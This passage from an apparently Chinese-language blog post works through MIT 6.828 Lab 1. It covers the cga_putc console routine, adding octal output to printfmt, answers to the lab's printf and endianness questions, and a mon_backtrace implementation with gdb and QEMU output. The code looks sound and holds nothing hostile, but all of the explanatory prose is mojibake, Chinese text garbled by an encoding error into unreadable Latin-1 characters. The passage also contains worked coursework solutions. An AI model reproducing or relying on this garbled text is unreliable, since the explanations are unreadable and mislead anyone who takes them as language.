<code>cga_putc()</code>ï¼Œè¿™æ˜¯å®ç°å­—ç¬¦è§„èŒƒåŒ–å­—ç¬¦æ‰“å°çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p><ul><li><p>é¦–å…ˆæ£€æŸ¥è‹¥æœªè®¾ç½®é¢œè‰²å‚æ•°åˆ™é»˜è®¤è®¾ç½®é»‘åº•ç™½å­—</p></li><li><p>ä¹‹åæ˜¯å¯¹ç‰¹æ®Šå­—ç¬¦çš„å¤„ç†ï¼Œå¯¹äºæ™®é€šå­—ç¬¦åˆ™æ˜¯ç›´æ¥å†™æ˜¾å­˜</p></li><li><p>åœ¨å®Œæˆä¹‹åæ£€æŸ¥å…‰æ ‡æ˜¯å¦è¶Šç•Œï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œ<strong>æ»šå±</strong>ï¼Œè¿™é‡Œå®ç°çš„æ–¹æ³•æ¯”è¾ƒç®€å•ç²—æš´ï¼Œç›´æ¥ç§»åŠ¨æ•´å—å†…å­˜åæ¸…ç©ºæœ€åä¸€è¡Œï¼Œå°†å…‰æ ‡ä½ç½®å‘å‰ç§»åŠ¨80å­—ç¬¦ï¼ˆä¸€è¡Œçš„å®½åº¦ï¼‰</p></li><li><p>æœ€åå‘æ˜¾å¡å¯¹åº”å¯„å­˜å™¨å†™å…¥å…‰æ ‡ä½ç½®</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cga_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-comment">// if no attribute given, then use black on white</span><br>    <span class="hljs-keyword">if</span> (!(c &amp; ~<span class="hljs-number">0xFF</span>))<br>        c |= <span class="hljs-number">0x0700</span>;<br><br>    <span class="hljs-keyword">switch</span> (c &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (crt_pos &gt; <span class="hljs-number">0</span>) &#123;<br>            crt_pos--;<br>            crt_buf[crt_pos] = (c &amp; ~<span class="hljs-number">0xff</span>) | <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:<br>        crt_pos += CRT_COLS;<br>        <span class="hljs-comment">/* fallthru */</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:<br>        crt_pos -= (crt_pos % CRT_COLS);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        crt_buf[crt_pos++] = c;        <span class="hljs-comment">/* write the character */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// What is the purpose of this?</span><br>    <span class="hljs-keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;<br>        <span class="hljs-type">int</span> i;<br><br>        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>        <span class="hljs-keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>            crt_buf[i] = <span class="hljs-number">0x0700</span> | <span class="hljs-string">&#x27; &#x27;</span>;<br>        crt_pos -= CRT_COLS;<br>    &#125;<br><br>    <span class="hljs-comment">/* move that little blinky thing */</span><br>    outb(addr_6845, <span class="hljs-number">14</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos &gt;&gt; <span class="hljs-number">8</span>);<br>    outb(addr_6845, <span class="hljs-number">15</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªå®ç°æ–¹æ³•å’Œç¬”è€…å½“æ—¶å†™å®éªŒæ€§è´¨ OS kernel çš„æ—¶å€™å€’æ˜¯ä¸€æ ·ï¼Œä¸è¿‡ä»¤ç¬”è€…ä¸çˆ½çš„æ˜¯ xv6 å°† <code>\t</code> å®ç°ä¸ºåˆ«æ‰­çš„ 5 ä¸ªç©ºæ ¼ï¼ˆæ¼ï¼‰</p></blockquote><p>è¿™ä¹ˆä¸€è½®åˆ†æä¸‹æ¥è¿™ä¸ªå­—ç¬¦è¾“å‡ºåŸè¯­å·²ç»åŸºæœ¬ä¸Šåˆ†æå¾—å·®ä¸å¤šäº†ï¼Œå‰©ä¸‹çš„ä¸€äº›é«˜çº§çš„å°è£…å‡½æ•°ç¬”è€…å°±ä¸æ·±å…¥åˆ†æè´´åœ¨è¿™é‡Œäº†ï¼Œä¸»è¦å°±æ˜¯å€ŸåŠ©è¿™ä¸ªå­—ç¬¦è¾“å‡ºåŸè¯­å®ç°çš„ä¸€äº› tricksï¼Œå…¶ä¸­å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡º xv6 å®ç°ä¸º <code>printfmt()</code> å‡½æ•°ï¼Œå…¶æ ¸å¿ƒä¸º <code>vprintfmt()</code> å‡½æ•°ï¼Œä¸»è¦æ˜¯ç”¨ä¸€ä¸ªæœ‰ç©·è‡ªåŠ¨çŠ¶æ€æœºè§£ææ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶ä»æ ˆä¸Šè¯»å–å‚æ•°è¾“å‡ºã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 8ï¼Œè¡¥å……æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°ä¸­çš„ <code>%o</code> å‚æ•°çš„å®ç°</p><blockquote><p>Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form â€œ%oâ€. Find and fill in this code fragment.</p></blockquote><p>xv6 éå¸¸è´´å¿ƒåœ°å°†æ•°å­—è¾“å‡ºå®ç°ä¸ºä¸€ä¸ªæ— å‰ç¼€çš„å¤šè¿›åˆ¶è¾“å‡ºå‡½æ•° <code>printnum()</code> ï¼Œå‚è€ƒ glibc ä¸­ printf çš„ 8 è¿›åˆ¶è¾“å‡ºæ˜¯æ²¡æœ‰å‰ç¼€çš„ï¼Œæˆ‘ä»¬åªéœ€è¦ä»æ ˆä¸Šè·å–å¯¹åº”æ•°å€¼ã€è®¾ç½® baseåç›´æ¥è·³è½¬è°ƒç”¨å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// (unsigned) octal</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-comment">// Replace this with your code.</span><br>    num = getuint(&amp;ap, lflag);<br>    base = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">goto</span> number;<br><br><span class="hljs-comment">//...</span><br><br>number:<br>    printnum(putch, putdat, num, base, width, padc);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>å†…æ ¸å…¥å£ç‚¹æ˜¯ <code>kern/entry.S</code>ï¼Œä¹‹åä¼šè°ƒç”¨åˆ° <code>kern/init.c</code> ä¸­çš„ <code>i386_init()</code>ï¼Œå…¶ä¸­æœ‰ä¸€å¥è°ƒç”¨äº† %o çš„è¾“å‡ºè¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;6828 decimal is %o octal!\n&quot;</span>, <span class="hljs-number">6828</span>);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ make clean ä¹‹åé‡æ–° make å† make qemuï¼ŒæŸ¥çœ‹æ•ˆæœï¼ŒæˆåŠŸå®ç° %o çš„è¾“å‡ºåŠŸèƒ½ï¼š</p><p><img src="https://s2.loli.net/2022/03/15/T8WRyaDCi1blp9M.png" alt="image.png"></p><p>æœ€åæ˜¯ 6.828 çš„ä¸€äº›ç»ƒä¹ é¢˜ï¼š</p><ol><li><p>Explain the interface betweenÂ printf.cÂ andÂ console.c. Specifically, what function doesÂ console.cÂ export? How is this function used byÂ printf.c?</p><p><code>console.c</code> æä¾›äº†å•ä¸ªå­—ç¬¦è¾“å‡ºçš„å‡½æ•° <code>cputchar()</code>ï¼Œåœ¨ <code>printf.c</code> ä¸­å°è£…ä¸º <code>putch()</code> å‡½æ•°è¿›è¡Œå•ä¸ªå­—ç¬¦çš„è¾“å‡º</p></li><li><p>Explain the following fromÂ console.c:</p><p>1 if (crt_pos &gt;= CRT_SIZE) {<br>2 int i;<br>3 memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));<br>4 for (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>5 crt_buf[i] = 0x0700 | â€™ ';<br>6 crt_pos -= CRT_COLS;<br>7 }</p><p>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯<strong>åœ¨å…‰æ ‡è¶…å‡º 80 x 24 æ˜¾ç¤ºåŒºåŸŸæ—¶è¿›è¡Œæ»šå±</strong>ï¼Œä¸»è¦åŸç†å°±æ˜¯å°†ç¬¬ä¸€è¡Œå¾€åçš„æ•°æ®éƒ½å‘å‰ç§»åŠ¨ä¸€è¡Œï¼Œå…‰æ ‡å‘å‰æ¸…ç©ºä¸€è¡Œçš„æ˜¾å­˜ä¸ºç©ºæ ¼åå‘å‰ç§»åŠ¨ä¸€è¡Œï¼ˆè¡Œå®½ 80 å­—ç¬¦ï¼‰</p></li><li><p>For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCCâ€™s calling convention on the x86.</p><p>Trace the execution of the following code step-by-step:</p><p>int x = 1, y = 3, z = 4;<br>cprintf(â€œx %d, y %x, z %d\nâ€, x, y, z);</p><ul><li><p>In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p>~~äºŒè¿›åˆ¶é€‰æ‰‹çš„é€åˆ†é¢˜ï¼Œ~~æŒ‡å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æŒ‡é’ˆä¸ xã€yã€z ä¸‰ä¸ªå‚æ•°éƒ½åœ¨æ ˆä¸Šï¼Œ<code>fmt</code> æŒ‡é’ˆæŒ‡å‘å­˜æ”¾æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä½äº .data æ®µä¸Šï¼Œ<code>ap</code> åˆ™æŒ‡å‘æ ˆä¸Šçš„å‚æ•° x</p></li><li><p>List (in order of execution) each call to <code>cons_putc</code>, <code>va_arg</code>, and <code>vcprintf</code>. For <code>cons_putc</code>, list its argument as well. For <code>va_arg</code>, list what <code>ap</code> points to before and after the call. For <code>vcprintf</code> list the values of its two arguments.</p><p><s>é¢˜ç›®å¤ªé•¿ä¸çœ‹ã€‚</s> <code>cons_putc</code> çš„å‚æ•°ä¸ºè¦è¾“å‡ºçš„å­—ç¬¦çš„æ•°æ®ï¼Œå®šä¹‰ä¸ºä¸€ä¸ª int ç±»å‹ï¼Œå®é™…ä¸Šåªç”¨åˆ°äº†ä½ 2 å­—èŠ‚ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º ASCII ç ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä¸ºæ˜¾ç¤ºçš„å­—ç¬¦é¢œè‰²ä¸èƒŒæ™¯è‰²ï¼›å¯¹äº <code>va_arg</code> è€Œè¨€ï¼Œ<code>ap</code>æŒ‡å‘æ ˆä¸Šçš„æŸä¸ªä½ç½®ï¼Œè¿™ä¸ªä½ç½®ä¸Šåº”å½“å­˜æ”¾ç€æˆ‘ä»¬çš„å¯å˜é•¿å‚æ•°ç»„ä¸­çš„æŸä¸ªå‚æ•°ï¼Œåœ¨è°ƒç”¨åå…¶ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ªå‚æ•°ï¼›<code>vcprintf</code> çš„ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯ <code>va_arg</code> å®¹å™¨</p></li></ul></li><li><p>Run the following code.</p><p>unsigned int i = 0x00646c72;<br>cprintf(â€œH%x Wo%sâ€, 57616, &amp;i);</p><p>What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Hereâ€™s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Hereâ€™s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>å°†ä»£ç æ·»åŠ åˆ° <code>init.c</code> ä¸­ï¼Œå®æµ‹è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">He110 World<br></code></pre></td></tr></table></figure><p>57616 ä½œä¸º 16 è¿›åˆ¶è¾“å‡ºä¸º e110ï¼Œè€Œ å˜é‡ i çš„å€¼è¢«ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è§£æï¼ˆæˆ‘ä»¬è¾“å…¥çš„å‚æ•°ä¸ºæŒ‡å‘ i çš„æŒ‡é’ˆï¼‰ï¼Œå› æ­¤è¾“å‡º â€œrldâ€ï¼›å¦‚æœæ˜¯å¤§ç«¯åºçš„è¯å‰è€…ä¸ä¼šæœ‰å˜åŒ–è€Œåè€…å› ä¸ºç›´æ¥ç¢°åˆ° â€œ\0â€ äºæ˜¯ä»€ä¹ˆä¹Ÿä¸è¾“å‡º</p></li><li><p>In the following code, what is going to be printed after <code>'y='</code>? (note: the answer is not a specific value.) Why does this happen?</p><p>cprintf(â€œx=%d y=%dâ€, 3);</p><p>yä¼šæ˜¯ä¸€ä¸ªç›¸å¯¹éšæœºçš„å€¼ï¼Œæœ‰ä¸€å®šæ¦‚ç‡ä¼šæ˜¯ä¸€ä¸ªæŒ‡å‘æ ˆä¸Šçš„æŒ‡é’ˆï¼ˆold rbpï¼‰ï¼Œå…³é”®å¾—çœ‹ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ï¼›è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨è°ƒç”¨ cprintf æ—¶åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­å†™æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä½†æˆ‘ä»¬åªä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œcprintf ä¼šä»æ ˆä¸Šå­˜æ”¾ 3 çš„ä½ç½®å†å¾€åè¯»ä¸€ä¸ªå‚æ•°æ‰“å°å‡ºæ¥</p></li><li><p>Letâ€™s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>ä½¿ç”¨æœ€åä¸€ä¸ªå‚æ•°æ¥æŒ‡å®šå‚æ•°çš„æ•°é‡å³å¯ã€‚</p></li></ol><p>æœ€åè¿˜æœ‰ä¸ªæ‰“å°ä¸åŒé¢œè‰²çš„ Challengeï¼Œæ‡’å¾—åšäº†</p><h3 id="The-Stack">The Stack</h3><p>è¿™ä¸€èŠ‚ä¸»è¦è®² x86 ä¸‹ C çš„å‡½æ•°è¿è¡Œæ—¶æ ˆä¸è°ƒç”¨çº¦å®šï¼Œå¹¶ç¼–å†™ä¸€ä¸ªèƒ½å¤Ÿæ‰“å°å †æ ˆ backtrace çš„å‡½æ•°ï¼ˆç±»ä¼¼äº Linux å†…æ ¸ crash ä»¥åæ‰“å°é”™è¯¯çš„é‚£ç§å‡½æ•°ï¼‰</p><p>é¦–å…ˆæ˜¯ Exercise 9ï¼Œæ‰¾åˆ°å†…æ ¸æ ˆåˆå§‹åŒ–çš„ä»£ç ã€å†…æ ¸æ ˆåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œä»¥åŠå†…æ ¸ä¿ç•™æ ˆç©ºé—´çš„æ–¹æ³•ä¸å †æ ˆæŒ‡é’ˆè¢«åˆå§‹åŒ–æŒ‡å‘è¯¥ç©ºé—´çš„ä½ç½®</p><blockquote><p>Exercise 9. Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which â€œendâ€ of this reserved area is the stack pointer initialized to point to?</p></blockquote><p>åœ¨å†…æ ¸å…¥å£å‡½æ•°ä¸­åœ¨è°ƒç”¨ <code>i386_init()</code> ä¹‹å‰æœ‰ä¸€æ®µä»£ç åˆå§‹åŒ–äº†å†…æ ¸æ ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Clear the frame pointer register (EBP)<br># so that once we get into debugging C code,<br># stack backtraces will be terminated properly.<br>movl    $0x0,%ebp            # nuke frame pointer<br><br># Set the stack pointer<br>movl    $(bootstacktop),%esp<br><br># now to C code<br>call    i386_init<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸Šæ‰‹è°ƒè¯•ä¸€ä¸‹ï¼Œç»“æœå¦‚ä¸‹ï¼Œæˆ‘ä»¬çœ‹åˆ°å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆespï¼‰æŒ‡å‘ <code>0xf0110000</code>ï¼Œè€Œæ ˆå¸§æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆebpï¼‰æŒ‡å‘ 0 åœ°å€ï¼Œå…³äºè¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¹‹é—´çš„å…³ç³»ç¬”è€…ä¸å†èµ˜å™ï¼Œè¯·å„ä½è¯»è€…è‡ªè¡Œå¤ä¹  C å‡½æ•°è°ƒç”¨æ ˆç›¸å…³çŸ¥è¯†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬çš„å†…æ ¸æ ˆè¢«åˆå§‹åŒ–åˆ°å†…å­˜é«˜åœ°å€ä¸­ä¸€ä¸ªå›ºå®šçš„ä½ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gdb">relocated () at kern/entry.S:74<br>74        movl    $0x0,%ebp            # nuke frame pointer<br>(gdb) si<br>=&gt; 0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp<br>relocated () at kern/entry.S:77<br>77        movl    $(bootstacktop),%esp<br>(gdb) si<br>=&gt; 0xf0100039 &lt;relocated+10&gt;:    call   0xf01000aa &lt;i386_init&gt;<br>80        call    i386_init<br>(gdb) info registers<br>eax            0xf010002f          -267386833<br>ecx            0x0                 0<br>edx            0xffffff40          -192<br>ebx            0x10094             65684<br>esp            0xf0110000          0xf0110000 &lt;entry_pgtable&gt;<br>ebp            0x0                 0x0<br>esi            0x10094             65684<br>edi            0x0                 0<br>eip            0xf0100039          0xf0100039 &lt;relocated+10&gt;<br>eflags         0x86                [ PF SF ]<br>cs             0x8                 8<br>ss             0x10                16<br>ds             0x10                16<br>es             0x10                16<br>fs             0x10                16<br>gs             0x10                16<br>(gdb) <br></code></pre></td></tr></table></figure><p>6.828 æ–‡æ¡£ä¸­å‘æˆ‘ä»¬æ­ç¤ºäº†æ ˆå›æº¯çš„åŸç†ï¼šæŒ‰ç…§ C å‡½æ•°è°ƒç”¨æ ˆçš„ç›¸å…³çº¦å®šï¼ŒebpæŒ‡é’ˆæŒ‡å‘æ ˆåº•ï¼Œè¿™ä¸ªä½ç½®ä¸Šå­˜æ”¾äº†ä¸Šä¸€å±‚è°ƒç”¨çš„ ebpï¼Œå†å¾€åä¸€ä¸ªä½ç½®å­˜æ”¾çš„æ˜¯è¯¥å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå³ä¸Šå±‚è°ƒç”¨å‡½æ•°ä¸­è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°çš„æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå› æ­¤åˆ©ç”¨ ebp æˆ‘ä»¬ä¾¿å¯ä»¥å›æº¯å¤šå±‚å‡½æ•°è°ƒç”¨æ ˆ</p><p>ä¸‹é¢çœ‹ Exercise 10ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ„ŸçŸ¥ C å‡½æ•°è°ƒç”¨æ ˆ</p><blockquote><p>Exercise 10.Â To become familiar with the C calling conventions on the x86, find the address of the <code>test_backtrace</code> function inÂ obj/kern/kernel.asm, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of <code>test_backtrace</code> push on the stack, and what are those words?</p><p>Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">tools</a> page or on Athena. Otherwise, youâ€™ll have to manually translate all breakpoint and memory addresses to linear addresses.</p></blockquote><p>ç„¶åæ˜¯ Exercise 11ï¼Œè®©æˆ‘ä»¬è¡¥å…¨å®ç° <code>mon_backtrace()</code></p><blockquote><p>Exercise 11.Â Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, runÂ make gradeÂ to see if its output conforms to what our grading script expects, and fix it if it doesnâ€™t. <em>After</em> you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.</p><p>If you use <code>read_ebp()</code>, note that GCC may generate â€œoptimizedâ€ code that calls <code>read_ebp()</code> <em>before</em> <code>mon_backtrace()</code>'s function prologue, which results in an incomplete stack trace (the stack frame of the most recent function call is missing). While we have tried to disable optimizations that cause this reordering, you may want to examine the assembly of <code>mon_backtrace()</code> and make sure the call to <code>read_ebp()</code> is happening after the function prologue.</p></blockquote><p>æˆ‘ä»¬éœ€è¦å®ç°æ‰“å°å¦‚ä¸‹æ ¼å¼çš„æ ˆå›æº¯</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">Stack backtrace:<br>  ebp f0109e58  eip f0100a62  args <span class="hljs-number">00000001</span> f0109e80 f0109e98 f0100ed<span class="hljs-number">2 00000031</span><br>  ebp f0109ed8  eip f<span class="hljs-number">01000d6</span>  args <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> f<span class="hljs-number">0100058</span> f0109f<span class="hljs-number">28 00000061</span><br>  ...<br></code></pre></td></tr></table></figure><p>åœ¨å†…æ ¸åˆå§‹åŒ–æ—¶å°† ebp è®¾ä¸ºäº†0ï¼Œè¿™æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªå¾ˆå¥½çš„ä½œä¸ºåˆ¤æ–­æ ˆå›æº¯ç»ˆæ­¢çš„æ¡ä»¶ï¼Œæœ€ç»ˆçš„æ ˆå›æº¯å‡½æ•°ä»£ç å¦‚ä¸‹ï¼Œç”±äº 6.828 è¯´ä»–ä»¬æä¾›çš„ <code>read_ebp()</code> å‡½æ•°å¯èƒ½ä¼šè¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰æ‰€ä»¥ç¬”è€…è‡ªå·±å†™äº†å†…è”æ±‡ç¼–ï¼š</p><blockquote><p>AT &amp; T è¯­æ³•ï¼Œéå¸¸ğŸ¥šç–¼</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-type">uint32_t</span> *old_ebp, last_eip;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;movl %%ebp, %0;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (old_ebp))</span>;<br>    cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (old_ebp)<br>    &#123;<br>        last_eip = old_ebp[<span class="hljs-number">1</span>];<br>        cprintf(<span class="hljs-string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, <br>            old_ebp, last_eip, old_ebp[<span class="hljs-number">2</span>], old_ebp[<span class="hljs-number">3</span>], old_ebp[<span class="hljs-number">4</span>], old_ebp[<span class="hljs-number">5</span>], old_ebp[<span class="hljs-number">6</span>]);<br>        old_ebp = (<span class="hljs-type">uint32_t</span> *) old_ebp[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸæ‰“å°æ ˆå›æº¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu</span><br>sed &quot;s/localhost:1234/localhost:26000/&quot; &lt; .gdbinit.tmpl &gt; .gdbinit<br>qemu-system-i386 -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::26000 -D qemu.log <br>6828 decimal is 15254 octal!<br>entering test_backtrace 5<br>entering test_backtrace 4<br>entering test_backtrace 3<br>entering test_backtrace 2<br>entering test_backtrace 1<br>entering test_backtrace 0<br>Stack backtrace:<br>  ebp f010ff18  eip f01000a5  args 00000000 00000000 00000000 f010004e f0111308<br>  ebp f010ff38  eip f010007a  args 00000000 00000001 f010ff78 f010004e f0111308<br>  ebp f010ff58  eip f010007a  args 00000001 00000002 f010ff98 f010004e f0111308<br>  ebp f010ff78  eip f010007a  args 00000002 00000003 